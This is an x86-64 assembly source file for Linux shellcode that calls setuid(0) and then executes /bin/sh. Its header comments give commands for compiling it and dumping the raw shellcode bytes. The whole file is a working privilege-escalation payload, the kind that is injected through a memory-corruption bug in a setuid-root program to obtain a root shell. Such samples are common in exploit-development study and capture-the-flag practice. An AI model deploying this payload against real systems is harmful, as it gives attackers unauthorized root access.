/*

Author: Abhinav Thakur
File:   setuid_execve_binsh.s
Compile:        $ gcc -Wl,-N -nostdlib -static setuid_execve_binsh.s -o ./setuid_execve_binsh.elf
Dump shellcode :$ objcopy --dump-section .text=setuid_execve_binsh.raw ./setuid_execve_binsh.elf
Run            :$ ./setuid_execve_binsh.elf

*/

.global _start
_start:
.intel_syntax noprefix

	/* setuid(0) */
	push 105
	pop rax							/* syscall number for setuid = 105 */
	xor edi, edi					/* uid = 0 */
	syscall	

    /*
        ; execve("//bin/sh", NULL, NULL)
    */
    xor esi, esi   					/* argv = NULL */
    push rsi						
    mov rdi, 0x68732f6e69622f2f		/* "hs/nib//" */
    push rdi        				/* rsp -> "//bin/sh" */
    push rsp
    pop rdi         				/* rdi -> "//bin/sh" */
    push 59         				/* syscall number for execve = 59 */
    pop rax
    cdq								/* sign-extend EAX -> EDX:EAX */
    syscall
